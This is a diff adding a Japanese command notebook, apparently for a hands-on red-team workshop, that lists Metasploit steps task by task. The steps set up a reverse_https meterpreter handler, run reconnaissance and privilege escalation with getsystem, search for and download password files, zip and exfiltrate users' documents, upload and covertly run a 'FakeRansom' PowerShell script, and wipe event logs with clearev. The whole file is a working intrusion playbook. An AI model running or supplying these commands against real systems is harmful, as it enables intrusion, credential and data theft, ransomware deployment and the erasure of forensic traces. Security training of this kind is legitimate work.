@@ -1,0 +1,71 @@
+#実行コマンドノート
+#それぞれの課題に利用するコマンドを記載しています。
+
+#課題1
+msfconsole
+---
+use exploit/multi/handler
+---
+set PAYLOAD windows/meterpreter/reverse_https
+---
+set LHOST 10.0.1.1xx
+---
+set LPORT 443
+---
+exploit
+
+※LHOSTのxxはユーザー番号です。 例）ユーザー番号が01の場合→10.0.1.101
+
+
+
+#課題2（コピーテキストなし）
+
+
+#課題3
+sysinfo
+---
+getuid
+---
+arp
+---
+ps
+
+
+
+#課題4
+load priv
+---
+getsystem
+---
+getuid
+
+#課題5
+search -d C:\\Users -f *password*
+---
+download 'C:\Users\handson-user-xx\Desktop\password.txt'
+---
+shell
+---
+powershell -Command "Compress-Archive -Path (Get-ChildItem -Path 'C:\Users\*\Desktop\*.docx' -File | Select-Object -ExpandProperty FullName) -DestinationPath C:\Users\Public\data.zip"
+---
+exit
+---
+download 'C:\Users\Public\data.zip'
+
+
+#課題6-1
+upload FakeRansom_JP.ps1 'C:\Users\Public\FakeRansom_JP.ps1'
+---
+execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\Users\Public\FakeRansom_JP.ps1" -H
+
+
+#課題6-2
+clearev
+
+
+#課題6-3
+exit
+---
+exit
+---
+cat password.txt
